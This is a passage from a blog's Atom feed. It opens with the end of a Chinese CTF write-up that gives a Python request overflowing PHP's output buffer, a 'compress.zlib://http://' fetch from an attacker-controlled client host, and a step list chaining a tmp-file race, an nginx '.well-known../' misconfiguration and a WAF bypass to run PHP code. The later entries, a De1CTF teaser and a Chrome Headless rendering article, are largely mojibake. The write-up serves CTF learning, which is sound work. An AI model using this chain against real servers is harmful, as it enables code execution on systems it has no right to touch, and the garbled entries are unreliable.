;&#x7136;&#x800C;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x8BF4;&#x5230;&#x7684;&#x9700;&#x8981;&#x4FDD;&#x7559;&#x7684;&#x957F;&#x94FE;&#x63A5;&#x4E0D;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7ACB;&#x5373;&#x5F97;&#x5230;&#x6211;&#x4EEC;&#x7684; sandbox &#x8DEF;&#x5F84;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x8FC7;&#x5927;&#x7684; name &#x53C2;&#x6570;&#xFF0C;&#x5BFC;&#x81F4; PHP output buffer &#x6EA2;&#x51FA;&#xFF0C;&#x5728;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x6C99;&#x7BB1;&#x8DEF;&#x5F84;&#xFF0C;&#x53C2;&#x8003;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    data = <span class="hljs-string">&apos;&apos;&apos;file=compress.zlib://http://192.168.151.132:8080&amp;name=&apos;&apos;&apos;</span>.strip() + <span class="hljs-string">&apos;a&apos;</span> * (<span class="hljs-number">1024</span> * <span class="hljs-number">7</span> + <span class="hljs-number">882</span>)</span><br><span class="line">    r.send(<span class="hljs-string">&apos;&apos;&apos;POST / HTTP/1.1\r</span></span><br><span class="line"><span class="hljs-string">Host: localhost\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Content-Length: {}\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="hljs-string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>.format(len(data), data))</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h3><p>&#x6240;&#x4EE5;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x4E3A;&#x4EE5;&#x4E0B;&#xFF1A;</p><ol><li>&#x5229;&#x7528; <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> &#x6765;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x6301; HTTP &#x957F;&#x94FE;&#x63A5;&#x7ADE;&#x4E89;&#x4FDD;&#x5B58;&#x6211;&#x4EEC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;</li><li>&#x5229;&#x7528;&#x8D85;&#x957F;&#x7684; name &#x6EA2;&#x51FA; output buffer &#x5F97;&#x5230; sandbox &#x8DEF;&#x5F84;</li><li>&#x5229;&#x7528; Nginx &#x914D;&#x7F6E;&#x9519;&#x8BEF;&#xFF0C;&#x901A;&#x8FC7; <code>.well-known../files/sandbox/</code>&#x6765;&#x83B7;&#x53D6;&#x6211;&#x4EEC; tmp &#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;</li><li>&#x53D1;&#x9001;&#x53E6;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684; tmp &#x6587;&#x4EF6;&#xFF0C;&#x6B64;&#x65F6;&#x5E76;&#x6CA1;&#x6709; PHP &#x4EE3;&#x7801;</li><li>&#x7ED5;&#x8FC7; WAF &#x5224;&#x65AD;&#x540E;&#xFF0C;&#x53D1;&#x9001; PHP &#x4EE3;&#x7801;&#x6BB5;&#xFF0C;&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684; PHP &#x4EE3;&#x7801;&#x62FF;&#x5230; Flag </li></ol><p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x5173;&#x952E;&#x70B9;&#x4E3B;&#x8981;&#x662F;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;(&#x6765;&#x81EA; @wupco)&#xFF1A;</p><ol><li>&#x9700;&#x8981;&#x5229;&#x7528;&#x5927;&#x6587;&#x4EF6;&#x6216;ftp&#x901F;&#x5EA6;&#x9650;&#x5236;&#x8BA9;&#x8FDE;&#x63A5;&#x4FDD;&#x6301;</li><li>&#x4F20;&#x5165;name&#x8FC7;&#x5927; overflow output buffer&#xFF0C;&#x5728;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x6C99;&#x7BB1;&#x8DEF;&#x5F84;</li><li>tmp&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5728;&#x4E24;&#x79CD;&#x6587;&#x4EF6;&#x76F4;&#x63A5;&#x75AF;&#x72C2;&#x5207;&#x6362;&#xFF0C;&#x4F7F;&#x5F97;&#x7B2C;&#x4E00;&#x6B21;<code>file_get_contents</code>&#x83B7;&#x53D6;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x5E26;&#x6709;<code>&lt;?</code>,<code>include</code>&#x7684;&#x65F6;&#x5019;&#x662F;&#x6B63;&#x5E38;php&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5361;&#x65F6;&#x95F4;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x591A;&#x8DD1;&#x51E0;&#x6B21;&#x624D;&#x884C;</li><li><code>.well-known../files/</code>&#x662F;nginx&#x914D;&#x7F6E;&#x6F0F;&#x6D1E;&#xFF0C;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#xFF0C;&#x7528;&#x6765;&#x5217;&#x751F;&#x6210;&#x7684;tmp&#x6587;&#x4EF6;</li></ol><p>&#x7531;&#x4E8E;&#x7B2C;&#x4E8C;&#x4E2A;&#x6781;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6BD4;&#x8F83;&#x51C6;&#x786E;&#x5730;&#x8C03;&#x63A7;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#xFF0C;&#x4E4B;&#x524D;&#x6CA1;&#x8C03;&#x63A7;&#x597D;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#xFF0C;&#x6302;&#x4E00;&#x665A;&#x4E0A;&#x811A;&#x672C;&#x90FD;&#x6CA1;&#x6709; hit &#x4E2D;&#x4E00;&#x6B21;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x7ECF;&#x8FC7; @rebirth &#x7684;&#x6DF1;&#x523B;&#x6307;&#x70B9;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x670D;&#x52A1;&#x5668;&#x54CD;&#x5E94;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x6210;&#x529F;&#x7387;&#x5F97;&#x5230;&#x4E86;&#x5F88;&#x5927;&#x7684;&#x63D0;&#x9AD8;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x6B21;&#x90FD;&#x53EF;&#x4EE5; getflag&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png" alt></p><p>&#x811A;&#x672C;&#x653E;&#x5728;<a href="https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65" target="_blank" rel="noopener">gist-exp.py</a>&#xFF0C;&#x5176;&#x4E2D; 192.168.34.1 &#x662F;&#x672C;&#x5730;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;192.168.151.132 &#x662F; client &#x7684;&#x5730;&#x5740;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/" target="_blank" rel="noopener">20191228-hxp36c3ctf</a></p><p><a href="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" target="_blank" rel="noopener">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p><p><a href="https://ctftime.org/task/10211" target="_blank" rel="noopener">https://ctftime.org/task/10211</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/</id>
        <title><![CDATA[CTF | 2020 De1CTF Misc Chowder WriteUp]]></title>
        <updated>2020-05-04T15:23:22+08:00</updated>
        <link href="https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/"><![CDATA[ËøôÂá†Â§©Êúâ‰∏™ De1CTFÔºåÁªìÊùüÂâçÊù•Áúã‰∫Ü‰∏ÄÁúºÈ¢òÁõÆÔºåÂÅö‰∫Ü‰∏™MiscÊùÇÁÉ©È¢òÔºåËøòÊòØÊå∫ÊúâÊÑèÊÄùÁöÑ„ÄÇÈ°∫‰æøÊù•ÊÄªÁªì‰∏Ä‰∏ãÂÖ≥‰∫é NTFS ‰∫§Êç¢Êï∞ÊçÆÊµÅÁöÑÁõ∏ÂÖ≥Â∫îÁî®Âêß„ÄÇ]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html</id>
        <title><![CDATA[Èù¢ÂçïÂ∑•ÂÖ∑ÔºöÂØπ Chrome Headless Ê∏≤ÊüìÁöÑÊûÅËá¥‰ºòÂåñ]]></title>
        <updated>2020-05-02T21:05:00+08:00</updated>
        <link href="https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html"/>
        <content type="text/html" src="https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html"><![CDATA[<h1>ËÉåÊôØ</h1><p>Êúâ‰∫õÂêåÂ≠¶ÂØπ‚ÄúÈù¢ÂçïÂ∑•ÂÖ∑‚ÄùËøô‰∏™È°πÁõÆÂ∫îËØ•‰∏çÁÆóÈôåÁîüÔºåÂõ†‰∏∫‰πãÂâçÊàëÂ∑≤ÁªèÂÜôËøáÂá†ÁØáË∑üÂÆÉÁõ∏ÂÖ≥ÁöÑÊñáÁ´†‰∫Ü„ÄÇÂÆÉÁöÑÂü∫Á°ÄÂäüËÉΩÊó†ÈùûÂ∞±ÊòØÁîªÈù¢ÂçïÔºöÂ¶ÇÊûú‰Ω†‰ªé Shopee ‰∏ä‰π∞‰∫ÜÁÇπ‰∏úË•øÔºåÈÇ£‰πàÂø´ÈÄí‰∏äÈù¢Ë¥¥ÁöÑÈù¢ÂçïÂ∞±ÊòØÁî®Ëøô‰∏™Â∑•ÂÖ∑ÁîªÂá∫Êù•ÁöÑ„ÄÇ</p><p>ÂèØËÉΩÊòØËøôÂ∑•ÂÖ∑Áî®Ëµ∑Êù•ÊØîËæÉÊñπ‰æøÔºåÈöèÁùÄ‰∏öÂä°ÁöÑÊâ©Âº†Ôºå‰∏Ä‰∫õ‰∏çÊòØÈù¢ÂçïÁöÑÂ•áÂ•áÊÄ™ÊÄ™ÁöÑ‰∏úË•ø‰πüÂºÄÂßãÂàáÊç¢Âà∞Èù¢ÂçïÂ∑•ÂÖ∑‰∏äÔºå‰æãÂ¶ÇÈááË¥≠Á≥ªÁªüÁöÑÂêàÂêåÔºàÊõ¥ÂÉèÊòØ Word Êñá‰ª∂Ôºâ„ÄÅ‰ªìÂ∫ìÁöÑÊù°ÂΩ¢Á†ÅÔºàÁî®‰∫ÜÁâπÊÆäÁ∫∏Âº†Ôºâ„ÄÅÊã£Ë¥ßÂçïÔºàÂèØ‰ª•ÁêÜËß£ÊàêÂ§ñÂçñÂçïÔºâÔºåËøôÂ∞±ÂØπÈù¢ÂçïÂ∑•ÂÖ∑ÁöÑÂèØÊâ©Â±ïÊÄßÊèêÂá∫‰∫ÜÊûÅÈ´òÁöÑË¶ÅÊ±Ç„ÄÇ‰∏çËøáËøô‰∏çÊòØÊú¨ÊñáÁöÑÈáçÁÇπÔºå‰πãÂêéÂÜç‰∏ìÈó®ÂÜôÊñáÁ´†Â•Ω‰∫Ü„ÄÇ</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/0.png" alt="Áî®Êù•ÁîªÊã£Ë¥ßÂçïÁöÑÁïåÈù¢" title="Áî®Êù•ÁîªÊã£Ë¥ßÂçïÁöÑÁïåÈù¢"></p><p>Êàë‰πãÂâçÂÜôËøá‰∏ÄÁØáÊñáÁ´†ÔºåËÆ≤ÁöÑÊòØÂ¶Ç‰Ωï‰ºòÂåñÁºñËæëÂô®ÁöÑÊ∏≤ÊüìÊïàÁéáÔºà500 ‰∏™ÂÖÉÁ¥†‰ªé 1 s ÈôçÂà∞ 100 msÔºâÔºåËøô‰∏™ÁªìÊûúÊàëÂ∑≤ÁªèÂæàÊª°ÊÑè‰∫Ü„ÄÇ‰ΩÜÊòØÈöèÁùÄÂ§ßÈáèÁöÑÁ≥ªÁªüÂºÄÂßã‰ΩøÁî®Ëøô‰∏™Â∑•ÂÖ∑ÔºåÂÆÉÈÅáÂà∞‰∫ÜÂè¶Â§ñ‰∏Ä‰∏™ÊÄßËÉΩÁì∂È¢à‚Äî‚ÄîÊúçÂä°Á´ØÊ∏≤ÊüìÂ§™ÊÖ¢‰∫Ü‚Ä¶‚Ä¶</p><h1>ÈóÆÈ¢òËß£Êûê</h1><p>‰∏ÄÂº†Èù¢ÂçïÔºå‰ªéÁºñËæëÂô®ÁöÑÁîªÂ∏É‰∏äÔºåÂà∞ÁîüÊàê‰∏Ä‰∏™ PDFÔºå‰∏≠Èó¥Á©∂Á´üÁªèÂéÜ‰∫Ü‰ªÄ‰πàÔºü</p><ol><li>ÂâçÁ´ØÂ∞ÜÁºñËæëÂô®‰∏≠ÁöÑ‰∏úË•øËΩ¨Êç¢‰∏∫Ê®°ÊùøËØ≠Ë®ÄÔºàÊàë‰ª¨ÈÄâÊã©‰∫Ü Django / pongo2ÔºâÔºõ</li><li>Á¨¨‰∏âÊñπÁ≥ªÁªüÈÄöËøá API Call Âèë‰∫Ü‰∏Ä‰∏™ËØ∑Ê±ÇÔºåË¶ÅÊ±Ç‰ΩøÁî®Êüê‰∏Ä‰∏™Ê®°ÊùøÔºåÂπ∂Êèê‰æõ‰∫ÜÊâÄÊúâÂøÖË¶ÅÁöÑÊï∞ÊçÆÔºàËÆ¢ÂçïÂè∑„ÄÅÂïÜÂìÅËØ¶ÊÉÖÁ≠âÔºâÔºõ</li><li>ÂêéÁ´ØÂØπÊï∞ÊçÆÂÅö‰∫ÜÊ†°È™å‰πãÂêéÔºå‰ΩøÁî®Ê®°ÊùøÂºïÊìéÁîüÊàê‰∏Ä‰ªΩÈù¢ÂçïÁöÑ HTMLÔºõ</li><li>ÂêéÁ´Ø‰ΩøÁî® Chrome Headless ÊâìÂºÄÂàöÁîüÊàêÁöÑ HTMLÔºåÂπ∂Â∞ÜÂÖ∂ÊâìÂç∞‰∏∫ PDFÔºõ</li><li>ÂêéÁ´ØÂ∞Ü PDF ËøîÂõûÁªôÁ¨¨‰∏âÊñπÁ≥ªÁªüÔºåÁ¨¨‰∏âÊñπÁ≥ªÁªüÂèØËÉΩ‰ºöÂ∞ÜÂÖ∂Â±ïÁ§∫Âú®Â±èÂπï‰∏äÔºåÊàñÁõ¥Êé•Ë∞ÉÂèñÁâπÊÆäÁöÑÊâìÂç∞Êú∫Êù•ÊâìÂç∞„ÄÇ</li></ol><p>ÂèØ‰ª•ÁúãÂá∫Êù•ÔºåËôΩÁÑ∂ÂÆûÁé∞‰∏Ä‰∏™ÁºñËæëÂô®ÁöÑÈöæÁÇπÂÖ®Âú®ÂâçÁ´ØÔºå‰ΩÜËÉΩ‰ΩøËøô‰∏™Â∑•ÂÖ∑ÁúüÊ≠£ÂèëÊå•ÂÖ∂‰∏öÂä°‰ΩúÁî®ÁöÑÂç¥ÊòØÂêéÁ´Ø„ÄÇÂΩì‰∏öÂä°ÈáèÂ¢ûÂä†ÁöÑÊó∂ÂÄôÔºåÂâçÁ´ØËÄÉËôëÁöÑÊòØÂ¶Ç‰ΩïÂÆûÁé∞ÂèØËÉΩÁöÑÊñ∞ÈúÄÊ±ÇÔºåËÄåÂêéÁ´ØÂàôÈúÄË¶ÅËÄÉËôëÂ¶Ç‰ΩïÂ∫îÂØπÈÄêÊ∏êÂ¢ûÈïøÁöÑ QPS„ÄÇ</p><h1>ÂêéÁ´ØÁöÑ‰ºòÂåñ</h1><p>Áî±‰∫éÂêéÁ´ØÁöÑÂêåÂ≠¶Êó†Ê≥ïÊé•Ëß¶Âà∞ÂÖ∑‰ΩìÁöÑÈù¢ÂçïÂÜÖÂÆπÔºàÊàñËÄÖËØ¥ÔºåÊé•Ëß¶Âà∞‰∫Ü‰πüÊó†ËÉΩ‰∏∫ÂäõÔºâÔºåÊâÄ‰ª•Âè™ËÉΩÂÅö‰∏Ä‰∫õÈÄöÁî®ÁöÑ‰ºòÂåñÔºö</p><ul><li>‰ΩøÁî®ËøõÁ®ãÊ±†ÔºåËÄå‰∏çÊòØÊØèÊ¨°Êñ∞ÊâìÂºÄ‰∏Ä‰∏™ Chrome HeadlessÔºõ</li><li>‰ΩøÁî® Debugging ProtocolÔºåÊØèÊ¨°Â§çÁî®‰πãÂâçÊâìÂºÄÁöÑÈ°µÈù¢Ôºõ</li><li>Á¶ÅÊ≠¢ÊéâÊèí‰ª∂„ÄÅÊ≤ôÁÆ±Á≠âÂäüËÉΩÔºõ</li><li>Âä†Êú∫Âô®‚Ä¶‚Ä¶</li></ul><p>ÂÖ∂ÂÆûËøôÂá†ÁÇπÂú®ÁΩë‰∏äÈÉΩËÉΩÊêúÂà∞„ÄÇÂèØËÉΩ‰ªñ‰ª¨ËøòÂÅö‰∫ÜÂÖ∂ÂÆÉÁöÑ‰ºòÂåñÔºå‰ΩÜÊàë‰∫ÜËß£ÁöÑÊöÇÊó∂Âè™ÊúâËøô‰∫õ‰∫Ü„ÄÇËøô‰∫õ‰ºòÂåñÂú®Èù¢ÂçïÂÜÖÂÆπ‰∏çÂ§çÊùÇÁöÑÊó∂ÂÄôËøòÊòØÈùûÂ∏∏ÊúâÁî®ÁöÑÔºåÁõ¥Âà∞Êüê‰∏™‰∏öÂä°ÊèêÂá∫‰∫Ü‰∏Ä‰∏™Â•áÊÄ™ÁöÑÈúÄÊ±Ç‚Ä¶‚Ä¶</p><h1>‰∏öÂä°ÁöÑÈúÄÊ±Ç</h1><p>Êúâ‰∏ÄÂ§©Ôºå‰∏öÂä°ÊèêÂá∫ÈúÄË¶Å‰∏Ä‰∏™Á•ûÂ•áÁöÑÊéíÁâàËßÑÂàôÔºö</p><ul><li>È¶ñÂÖàÔºåÈúÄË¶ÅÂÆûÁé∞‰∏Ä‰∏™Êã£Ë¥ßÂçïÔºöÂèØ‰ª•ÁêÜËß£‰∏∫Â§ñÂçñÁöÑÂ∞èÁ•®Ôºå‰∏ÄÂºÄÂßãÊòØ‰∏Ä‰∏™Â§¥ÈÉ®Âå∫ÂüüÔºàÂÖ¨Âè∏Âêç„ÄÅËÆ¢ÂçïÂè∑„ÄÅ‰∏ãÂçïÊó∂Èó¥„ÄÅÂ§áÊ≥®Á≠âÔºâÔºåÁÑ∂ÂêéÊòØ‰∏Ä‰∏™Ë°®Ê†ºÔºàÂïÜÂìÅ„ÄÅÊï∞Èáè„ÄÅ‰ª∑Ê†ºÔºâÔºåÊúÄÂêéÊòØ‰∏Ä‰∏™Â∞æÈÉ®Âå∫ÂüüÔºà‰ªòÊ¨æ‰ø°ÊÅØ„ÄÅÈÖçÈÄÅ‰ø°ÊÅØÔºâÔºõÊã£Ë¥ßÂçïÊòØÊâìÂú®Á∫µÂêë A6 Á∫∏‰∏äÁöÑÔºåÂπ∂‰∏îË°®Ê†ºÁöÑË°åÊï∞ÂèØ‰ª•‰ªªÊÑèÂ§öÔºåÂéüÂàô‰∏äÊù•ËØ¥ÔºåÊØè‰∏ÄÈ°µÁöÑË°®Ê†ºÊúÄÂêéÈÉΩË¶ÅÊúâ‰∏Ä‰∏™Â∞æÈÉ®Âå∫ÂüüÔºõ</li><li>ÁÑ∂ÂêéÔºåÈúÄË¶ÅÂÆûÁé∞‰∏ÄÁªÑÊã£Ë¥ßÂçïÔºöËã•Âπ≤Âº†Êã£Ë¥ßÂçïË¢´ÊéíÂàóÂú® A4 Á∫∏‰∏äÔºåÂÆÉ‰ª¨‰πãÈó¥ÁöÑÊéíÁâàËßÑÂàôÂèØ‰ª•ÁêÜËß£‰∏∫ Word ÁöÑÂàÜÊ†èÊéíÁâàËßÑÂàô„ÄÇ</li></ul><p>Ëøô‰∏™ÈúÄÊ±ÇÂõ†‰∏∫Êüê‰∫õÂéüÂõ†ÊòØÊé®‰∏çÊéâÁöÑÔºåÁîöËá≥ËøûÊéíÁâàËßÑÂàôÈÉΩ‰∏çËÉΩ‰øÆÊîπÔºà‰∏öÂä°Âº∫ÁÉàË¶ÅÊ±ÇÔºåËØ¥ÊòØÂΩìÂú∞ÁöÑÂçñÂÆ∂Â∏åÊúõËøôÊ†∑ÔºåÂπ∂‰∏îÊàë‰ª¨ÁöÑÊüê‰∏™Á´û‰∫âÂØπÊâãÂ∑≤ÁªèÊúâËøôÊ†∑ÁöÑÂäüËÉΩ‰∫ÜÔºâ„ÄÇ</p><p>Áî±‰∫éË°®Ê†ºÊï∞ÊçÆÁöÑ‰∏çÁ°ÆÂÆöÊÄßÔºå‰ª•ÂèäÂàÜÊ†èÊéíÁâàÁöÑÈÄªËæëÂíå‚ÄúÊØè‰∏ÄÈ°µÁöÑË°®Ê†ºÊúÄÂêéÈÉΩË¶ÅÊúâ‰∏Ä‰∏™Â∞æÈÉ®Âå∫Âüü‚ÄùÁöÑÈúÄÊ±ÇÂÆûÂú®ÊòØË∂ÖÂá∫‰∫Ü Chrome Ëá™Ë∫´ÁöÑÊéíÁâàËÉΩÂäõÔºåÊàëË∑üÂêéÁ´ØÂêåÂ≠¶ÂïÜÈáè‰∫ÜÂçäÂ§©Ôºå‰∏çÂæó‰∏çÂÜ≥ÂÆöÂú®ÊúçÂä°Á´Ø‰ΩøÁî® JavaScript ÊéíÁâàÔºåÂç≥ÊàëÊääÊéíÁâàÁöÑ‰ª£Á†ÅÊ≥®ÂÖ•Âà∞Ê®°Êùø‰∏≠ÔºåÂêéÁ´ØÂú® Chrome Headless ‰∏≠ÊâìÂºÄÊó∂Â∞±‰ºöÊâßË°åËøôÊÆµÊéíÁâà‰ª£Á†Å„ÄÇÊàëËØ¥ËøôÂèØËÉΩ‰ºöÊØîÂÖ∂ÂÆÉÊôÆÈÄöÈù¢ÂçïÂ§ö 100 ms ÁöÑÁîüÊàêÊó∂Èó¥ÔºåÂêéÁ´ØÂêåÂ≠¶Ë°®Á§∫Ôºö‚ÄúË¶ÅÂì≠‰∫ÜÔºåÊàëÂà∞Âì™ÂÑøÂÜçÁªô‰Ω†Êå§Âá∫ 100 ms Âïä‚Ä¶‚Ä¶‚Äù</p><p>‰∏çËøáÂêêÊßΩÂΩíÂêêÊßΩÔºåÂÅöËøòÊòØË¶ÅÂÅöÁöÑÔºå‰∫éÊòØÁªèËøá‰∫Ü‰∏ÄÂë®Â§öÁöÑÂºÄÂèëÔºåÊàë‰∏çÂÖâÂÜôÂÆå‰∫ÜÊéíÁâàÁöÑ‰ª£Á†ÅÔºåËøòÈáçÊûÑ‰∫Ü‰∏Ä‰∏ãÁºñËæëÂô®Ôºå‰ΩøÂÖ∂ÂèØ‰ª•Êñπ‰æøÁöÑÊâ©Â±ïÂÖ∂ÂÆÉ‰∏öÂä°Âú∫ÊôØ„ÄÇ</p><p>ÁÑ∂ÂêéÔºå‰∏öÂä°Ë¶ÅÊ±ÇÂèØ‰ª•Âú®‰∏Ä‰∏™ÁªÑ‰∏≠ÊéíÂàóÂ§öËææ 50 Âº†Êã£Ë¥ßÂçïÔºåÂπ∂‰Ωú‰∏∫‰∏Ä‰∏™ PDF Êñá‰ª∂ËøîÂõû„ÄÇÊàë‚Ä¶‚Ä¶@%$!&^</p><p><img src="https://static.rexskz.info/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="Ëøô‰∏çÊòØÂùëÁàπÂêóÔºÅ" title="Ëøô‰∏çÊòØÂùëÁàπÂêóÔºÅ"></p><p>ÂΩìÁÑ∂Ôºå‰Ωú‰∏∫‰∏Ä‰∏™‰∏ì‰∏öÁöÑÂ∑•Á®ãÂ∏àÔºå‰∏öÂä°ÁöÑÈúÄÊ±ÇÊÄªÊòØËÉΩÂÅöÁöÑÔºå‰∫éÊòØÂèàËä±‰∫Ü‰∏§Â§©Êó∂Èó¥ÊêûÂá∫Êù•‰∫Ü„ÄÇÁÑ∂ËÄå QA Â∞èÂßêÂßêÂÅö‰∫Ü‰∏Ä‰∏ãÊÄßËÉΩÊµãËØïÔºöÁî® 50 ‰∏™Èù¢ÂçïÁöÑÊï∞ÊçÆÊù•ËØ∑Ê±ÇÔºåÁªìÊûúÂèëÁé∞ÈúÄË¶ÅËá≥Â∞ë 100 s„ÄÇÊàëÊãøÂà∞ HTML ‰πãÂêéÂú®Ëá™Â∑±ÁöÑÂ§ñÊòü‰∫∫‰∏äË∑ë‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞‰πüÈúÄË¶Å 16 sÔºåËøôÂ§™ÊÖ¢‰∫ÜÔºÅ</p><h1>ÂâçÁ´ØÁöÑ‰ºòÂåñ</h1><h2>ÊúÄÂéüÂßãÁöÑ‰ª£Á†Å</h2><p>ÊãøÂà∞‰∫ÜÁîüÊàêÁöÑ HTML Êñá‰ª∂ÂêéÔºåÂú®Êú¨Âú∞ÁöÑ Chrome ÊâìÂºÄ„ÄÇÁî±‰∫éÊúçÂä°Âô®Ê≤°Êúâ GPUÔºåÂõ†Ê≠§‰∏∫‰∫ÜË∑üÊúçÂä°Âô®‰∏ÄËá¥ÔºåÊàëÁ¶ÅÁî®‰∫Ü Chrome ÁöÑÁ°¨‰ª∂Âä†ÈÄü„ÄÇÊü•Áúã‰∏Ä‰∏ã Performance Èù¢ÊùøÔºåÊòØËøôÊ†∑ÁöÑÔºö</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/1.png" alt="ÊÉ®‰∏çÂøçÁùπÁöÑÊÄßËÉΩ" title="ÊÉ®‰∏çÂøçÁùπÁöÑÊÄßËÉΩ"></p><p>Â¶àËÄ∂ÔºåË¶ÅË¢´ÂêìÊ≠ª‰∫Ü‚Ä¶‚Ä¶‰πü‰∏çÁ¶ÅÊÑüÊÖ®ÈÅìÔºåÁé∞‰ª£ÊµèËßàÂô®Ê≤°Êúâ GPU Âä†ÈÄüÊòØ‰∏á‰∏á‰∏çËÉΩÁöÑ„ÄÇ</p><p>QA ÁªôÁöÑÊñá‰ª∂‰∏≠ÔºåÊØè‰∏™Èù¢ÂçïÈÉΩÊúâ 30 ‰∏™‚ÄúÂïÜÂìÅ‚ÄùÔºåÊØè‰∏™‚ÄúÂïÜÂìÅ‚ÄùÈÉΩÊúâÂõõÂàóÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÊàëË¶ÅÂØπ <code>50*30*4=6000</code> ‰∏™ÂÖÉÁ¥†ÂÅöÁé∞Âú∫ÊéíÁâà„ÄÇ</p><h2>Êú¥Á¥†ÁöÑ‰ºòÂåñ</h2><p>‰ªîÁªÜËßÇÂØü‰∫Ü‰∏Ä‰∏ãÔºåÂ¶ÇÊûúËØ¥ 40 s ‰πãÂêéÊòØÁé∞Âú∫ÊéíÁâàÁöÑÊÉÖÂÜµÔºåÈÇ£‰πàÂâç 40 s ÈöæÈÅìÂè™ÊòØÂú®Ê∏≤ÊüìÊúÄÂàùÁöÑ HTML ÁªìÊûÑÔºü‰∏∫‰ªÄ‰πà Recalculate Style ÁöÑÊó∂Èó¥Ë∂äÊù•Ë∂äÈïøÔºü</p><p>‰ªîÁªÜÊÉ≥‰∏Ä‰∏ã‰πü‰∏çÂ•áÊÄ™ÔºåÂõ†‰∏∫Ê≠§Êó∂Â∞öÊú™ÂºÄÂßãÊâßË°åÊàëÁöÑÊéíÁâà‰ª£Á†ÅÔºåÂõ†Ê≠§ÊâÄÊúâÁöÑÂå∫ÂüüÂíåË°®Ê†ºÈÉΩ‰ºöÂ†ÜÁßØÂú® <code>(0, 0)</code> ÁöÑ‰ΩçÁΩÆ„ÄÇËÄå Chrome ÁöÑÊ∏≤ÊüìÊòØ‰∏ÄËæπ Parse HTML ‰∏ÄËæπÊ∏≤ÊüìÔºåÊØèÊ∏≤Êüì‰∏ÄÊ¨°Â∞±‰ºö Recalculate Style 